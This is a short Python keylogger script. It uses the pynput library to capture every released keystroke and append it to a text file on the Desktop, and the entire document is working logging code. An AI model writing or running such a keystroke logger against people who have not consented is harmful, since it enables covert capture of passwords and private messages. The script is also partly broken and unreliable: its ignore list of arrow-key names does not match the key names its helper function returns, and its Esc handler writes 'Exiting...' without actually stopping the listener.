#!/usr/bin/env python3 

from pynput import keyboard
from os.path import join

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_release(key):
    path = '/Users/username/Desktop' #Insert your path to desktop
    keys_to_ignore = ['Key.rightKey', 'Key.leftKey','Key.upKey', 'Key.downKey']

    with open(join(path, 'log_file.txt'), 'a') as f:
        key_name = get_key_name(key)
        for key in keys_to_ignore:
            if key_name == key:
                f.write(' ')
        
        if key_name == 'Key.space':
            f.write(' ')
        elif key_name == 'Key.enter':
            f.write('\n')
        elif key_name == 'Key.backspace':
            f.write(' Backspace ')
        elif key_name == 'Key.esc':
            f.write('Exiting...')
            f.close()
        else:
            f.write(key_name)
    
with keyboard.Listener(
    on_release=on_release) as listener:
    listener.join()
